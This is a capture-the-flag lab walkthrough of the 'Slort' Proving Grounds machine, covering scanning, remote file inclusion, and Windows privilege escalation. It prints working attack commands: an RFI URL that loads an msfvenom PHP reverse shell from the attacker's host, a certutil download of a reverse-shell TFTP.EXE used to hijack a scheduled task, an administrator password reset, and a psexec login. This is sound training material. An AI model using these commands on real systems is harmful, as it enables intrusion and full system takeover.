---
description: PG Practice Slort Writeup
---

# Slort

## Nmap

```
sudo nmap 192.168.230.53 -p- -sS -sV

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
```

Both port 8080 and 4443 contain the same web directory redirecting both to the /dashboard/ directory for XAMPP.

![](<../../../.gitbook/assets/image (1030).png>)

Running `dirsearch.py` against the target reveals the /site page.

```
python3 dirsearch.py -u http://192.168.230.53:8080 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 60 --full-url 
```

![](<../../../.gitbook/assets/image (1031) (1).png>)

The /site/index.php page:

![](<../../../.gitbook/assets/image (1032).png>)

Paying close attention to the full address of the index.php page we can see the following:

```
http://192.168.230.53:8080/site/index.php?page=main.php
```

Looking at the part index.php?page=\<Value> we can test for RFI to see if vulnerable. I created a test.txt file on my attacking machine and then hosted the directory with a `Python SimpleHTTPServer`. Then browsed to the following:

```
http://192.168.230.53:8080/site/index.php?page=http://192.168.49.230/test.txt
```

This confirms RFI:

![](<../../../.gitbook/assets/image (1033).png>)

As we know we are running PHP we can generate a PHP reverse shell with `msfvenom` in order to catch a reverse shell using the RFI.

```
msfvenom -p php/reverse_php LHOST=192.168.49.230 LPORT=21 -f raw > phpreverseshell.php
```

![](<../../../.gitbook/assets/image (1034).png>)

Host this in the same directory as the `Python SimpleHTTPServer` and ensure the listening port is set to 21. Then in the browser browse to the shell we just generated.

```
http://192.168.230.53:8080/site/index.php?page=http://192.168.49.230/phpreverseshell.php
```

![](<../../../.gitbook/assets/image (1035).png>)

Once we are connected we are running as the user rupert. Looking through the C:\ root directory we have a folder called backup. Looking at the contents within and reading info.txt we see that the note mentions `TFTP.EXE` is executed every 5 minutes.

![](<../../../.gitbook/assets/image (1036).png>)

I was able to delete `TFTP.EXE` which means we can replace it with a malicious shell. Knowing this we can generate a reverse shell with `msfvenom` and call it `TFTP.EXE`.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.230 LPORT=21 -f exe > TFTP.EXE 
```

The shell was then uploaded with `certutil.exe`.

```
certutil.exe -f -urlcache -split http://192.168.49.230/TFTP.EXE
```

![](<../../../.gitbook/assets/image (1037) (1).png>)

A `netcat` listener was set up on port 21 and after 5 minutes the `TFTP.EXE` was executed as part of the scheduled task and we receive an administrator shell.

![](<../../../.gitbook/assets/image (1038).png>)

As we are administrator we can then escalate to SYSTEM by fist changing the administrator password:

```
net user administrator Password123
```

![](<../../../.gitbook/assets/image (1039).png>)

Then using `Psexec.py` to gain shell as SYSTEM.

```
sudo python2 psexec.py /administrator:Password123@192.168.230.53 
```

![](<../../../.gitbook/assets/image (1040).png>)
